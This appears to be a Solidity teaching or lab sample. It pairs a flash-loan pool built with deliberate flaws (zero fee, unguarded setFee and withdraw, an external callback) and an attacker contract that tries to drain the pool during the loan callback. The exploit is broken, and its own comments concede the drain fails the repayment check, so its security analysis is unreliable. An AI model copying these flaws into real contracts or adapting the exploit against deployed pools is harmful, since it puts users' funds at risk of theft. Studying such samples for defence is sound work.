// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract FlashLoanVuln {
    IERC20 public token;
    uint256 public protocolFee;
    uint256 public reserve;

    event LoanTaken(address indexed borrower, uint256 amount, uint256 fee);
    event LoanRepaid(address indexed borrower, uint256 amount, uint256 fee);

    constructor(address _token) {
        token = IERC20(_token);
        protocolFee = 0; // VULNERABILITY: fee can be zero
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(amount <= balanceBefore, "Insufficient reserve");

        uint256 fee = (amount * protocolFee) / 10000;

        // Transfer loan to borrower
        token.transfer(msg.sender, amount);

        // VULNERABILITY: borrower can re-enter before repayment check
        (bool ok, bytes memory data) = msg.sender.call(
            abi.encodeWithSignature("executeOperation(uint256,uint256,address)", amount, fee, msg.sender)
        );
        require(ok, "Callback failed");
        // VULNERABILITY: no strict balance check — uses balanceAfter >= balanceBefore
        // An attacker can drain via reentrancy or manipulate the balance check
        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Loan not repaid");

        emit LoanRepaid(msg.sender, amount, fee);
    }

    // VULNERABILITY: no access control on deposit/withdraw during flash loan
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        reserve += amount;
    }

    function withdraw(uint256 amount) external {
        require(amount <= reserve, "Insufficient reserve");
        reserve -= amount;
        token.transfer(msg.sender, amount);
    }

    function setFee(uint256 _fee) external {
        protocolFee = _fee; // VULNERABILITY: no access control
    }
}

contract FlashLoanExploiter {
    FlashLoanVuln public pool;
    IERC20 public token;

    constructor(address _pool, address _token) {
        pool = FlashLoanVuln(_pool);
        token = IERC20(_token);
    }

    // Exploit: re-enter during callback to drain
    function exploit(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function executeOperation(uint256 amount, uint256 fee, address) external returns (bool) {
        // During callback, drain all tokens from pool
        uint256 poolBalance = token.balanceOf(address(pool));
        // Use withdraw function to drain while flash loan is in-flight
        pool.withdraw(poolBalance);
        // Return nothing — pool balance check will pass because
        // we withdrew after the loan, so balanceAfter == 0?
        // Actually no — the check is balanceAfter >= balanceBefore, so
        // we'd need to manipulate this differently.
        // More sophisticated attack uses the fee=0 and reentrancy.
        return true;
    }
}
